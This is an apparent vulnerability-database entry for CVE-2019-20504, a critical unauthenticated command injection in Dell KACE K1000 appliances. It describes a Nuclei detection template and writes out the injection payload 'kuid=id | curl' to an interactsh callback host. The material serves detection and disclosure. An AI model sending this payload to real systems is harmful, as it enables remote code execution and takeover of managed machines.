---
cve_id: CVE-2019-20504
template_path: nuclei-templates/http/cves/2019/CVE-2019-20504.yaml
affected_product: Dell KACE Systems Management Appliance (K1000)
severity: critical
authentication: none
external_callback: true
affected_versions: before 6.4 SP3 (6.4.120822)
preconditions: []
poc_classification: rce
---

## Vulnerability
service/krashrpt.php in Quest KACE K1000 Systems Management Appliance before 6.4 SP3 (6.4.120822) allows a remote attacker to execute code via shell metacharacters in the kuid parameter (CWE-78).  
Unauthenticated attackers can execute arbitrary system commands, leading to complete server compromise and access to all managed systems.  
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8). Fixed by upgrading to 6.4.120822 or later.

## PoC / Detection
Classification: rce

The template first issues a GET / request and internally matches for the string "K1000" in the response body to fingerprint the appliance. It then issues a POST /service/krashrpt.php request with the payload `kuid=id | curl http://{{interactsh-url}}` and confirms successful command injection by matching a DNS interaction on interactsh_protocol.

## References
- https://www.exploit-db.com/exploits/46684
- https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/
- https://nvd.nist.gov/vuln/detail/CVE-2019-20504
